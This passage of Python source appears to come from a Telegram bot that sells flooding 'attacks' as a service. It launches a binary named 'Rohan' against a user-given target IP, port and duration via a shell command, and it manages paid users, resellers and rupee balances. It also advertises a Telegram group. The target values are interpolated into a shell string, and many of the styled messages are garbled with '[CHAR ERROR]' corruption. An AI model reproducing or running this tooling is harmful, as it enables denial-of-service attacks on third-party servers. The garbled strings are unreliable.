        send_response(message, "𝗘𝗿𝗿𝗼[CHAR ERROR]_r: 𝗦𝘆𝘀𝘁𝗲𝗺 𝗿𝗲𝘀𝗼𝘂[CHAR ERROR]_r𝗰𝗲𝘀 𝗼𝘃𝗲[CHAR ERROR]_r𝗹𝗼𝗮𝗱𝗲𝗱")
        return
    rohan_binary = os.path.join(BASE_DIR, "Rohan")
    if not os.path.isfile(rohan_binary) or not os.access(rohan_binary, os.X_OK):
        send_response(message, "𝗘𝗿𝗿𝗼[CHAR ERROR]_r: 𝗥𝗼𝗵𝗮𝗻 𝗯𝗶𝗻𝗮[CHAR ERROR]_r𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼[CHAR ERROR]_r 𝗻𝗼𝘁 𝗲𝘅𝗲𝗰𝘂𝘁𝗮𝗯𝗹𝗲")
        return
    ongoing_attacks[user_id] = True
    record_command_logs(user_id, 'attack', target, port, time)
    log_command(user_id, target, port, time)
    full_command = f"./Rohan {target} {port} {time} 65507"
    response = (
        "✅ **COSMIC STRIKE LAUNCHED** ✅\n"
        f"⭐ **Target**: {target}\n"
        f"⭐ **Port**: {port}\n"
        f"⭐ **Time**: {time} seconds\n"
        "https://t.me/+GYbpAGalM1yOOTU1\n\n"
        "📢 Swiftly 24x7Seller trust **SERVER**\n"
        "[VIEW GROUP]"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("VIEW GROUP", url="https://t.me/+GYbpAGalM1yOOTU1"))
    send_response(message, response, markup)
    subprocess.Popen(full_command, shell=True)
    def cleanup_attack():
        if user_id in ongoing_attacks:
            del ongoing_attacks[user_id]
        bot.send_message(message.chat.id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅")
    threading.Timer(time, cleanup_attack).start()
    last_attack_time[user_id] = datetime.datetime.now(pytz.UTC)
    save_json(LAST_ATTACK_FILE, {k: v.isoformat() for k, v in last_attack_time.items()})

@bot.message_handler(func=lambda m: m.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    username = escape_markdown(message.chat.username or "No username")
    user_id_escaped = escape_markdown(user_id)
    if user_id in admin_id:
        role, expiration, balance = "Admin", "No expiration", "Not Applicable"
        if user_id in permanent_admins:
            role = "Permanent Admin"
    elif user_id in resellers:
        role, expiration, balance = "Reseller", "No expiration", str(resellers.get(user_id, 0))
    elif user_id in users:
        role, expiration, balance = "User", users[user_id], "Not Applicable"
    else:
        role, expiration, balance = "Guest", "No active key", "Not Applicable"
    response = (
        f"👤 *USER INFORMATION* 👤\n\n"
        f"ℹ️ *Username*: @{username}\n"
        f"🆔 *UserID*: {user_id_escaped}\n"
        f"🚹 *Role*: {escape_markdown(role)}\n"
        f"🕘 *Expiration*: {escape_markdown(expiration)}\n"
    )
    if role == "Reseller":
        response += f"💰 *Balance*: {escape_markdown(balance)} Rs\n"
    send_response(message, response)

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    if not users:
        send_response(message, "⚠️ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼[CHAR ERROR]_r𝗶𝘇𝗲𝗱 𝘂𝘀𝗲[CHAR ERROR]_r𝘀 𝗳𝗼𝘂𝗻𝗱")
        return
    response = "✅ 𝗔𝘂𝘁𝗵𝗼[CHAR ERROR]_r𝗶𝘇𝗲𝗱 𝗨𝘀𝗲[CHAR ERROR]_r𝘀 ✅\n\n"
    for user, expiration in users.items():
        user_info = bot.get_chat(user)
        username = escape_markdown(user_info.username or user_info.first_name or "Unknown")
        response += f"• 𝗨𝘀𝗲[CHAR ERROR]_r 𝗜𝗗: {escape_markdown(user)}\n  𝗨𝘀𝗲[CHAR ERROR]_r𝗻𝗮𝗺𝗲: @{username}\n  [CHAR ERROR]_E𝘅𝗽𝗶[CHAR ERROR]_r𝗲𝘀: {escape_markdown(expiration)}\n\n"
    send_response(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /[CHAR ERROR]_r𝗲𝗺𝗼𝘃𝗲 <𝘂𝘀𝗲[CHAR ERROR]_r_𝗶𝗱>")
        return
    target_user_id = cmd[1]
    if target_user_id in users:
        del users[target_user_id]
        save_json(USER_FILE, users)
        send_response(message, f"✅ 𝗨𝘀𝗲[CHAR ERROR]_r {escape_markdown(target_user_id)} [CHAR ERROR]_r𝗲𝗺𝗼𝘃𝗲𝗱")
    else:
        send_response(message, f"⚠️ 𝗨𝘀𝗲[CHAR ERROR]_r {escape_markdown(target_user_id)} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    if not resellers:
        send_response(message, "⚠️ 𝗡𝗼 [CHAR ERROR]_r𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r𝘀 𝗳𝗼𝘂𝗻𝗱")
        return
    response = "✅ 𝗔𝘂𝘁𝗵𝗼[CHAR ERROR]_r𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r𝘀 ✅\n\n"
    for reseller_id, balance in resellers.items():
        reseller_info = bot.get_chat(reseller_id)
        username = escape_markdown(reseller_info.username or reseller_info.first_name or "Unknown")
        response += f"• [CHAR ERROR]_U𝘀𝗲[CHAR ERROR]_r𝗻𝗮𝗺𝗲: {username}\n  [CHAR ERROR]_U𝘀𝗲[CHAR ERROR]_r𝗜𝗗: {escape_markdown(reseller_id)}\n  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {escape_markdown(str(balance))} Rs\n\n"
    send_response(message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 3:
        send_response(message, "[CHAR ERROR]_U𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <[CHAR ERROR]_r𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>")
        return
    reseller_id, amount = cmd[1], float(cmd[2])
    if reseller_id not in resellers:
        send_response(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
        return
    resellers[reseller_id] += amount
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗱𝗱𝗲𝗱 ✅\n𝗔𝗺𝗼𝘂𝗻𝘁: {amount} Rs\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r 𝗜𝗗: {escape_markdown(reseller_id)}\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]} Rs")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "[CHAR ERROR]_U𝘀𝗮𝗴𝗲: /[CHAR ERROR]_r𝗲𝗺𝗼𝘃𝗲_[CHAR ERROR]_r𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r <[CHAR ERROR]_r𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r_𝗶𝗱>")
        return
    reseller_id = cmd[1]
    if reseller_id not in resellers:
        send_response(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
        return
    del resellers[reseller_id]
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲[CHAR ERROR]_r {escape_markdown(reseller_id)} [CHAR ERROR]_r𝗲𝗺𝗼𝘃𝗲𝗱")

if __name__ == "__main__":
    load_data()
    import sys
    if sys.version_info < (3, 6):
        sys.exit("Error: Python 3.6+ required")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)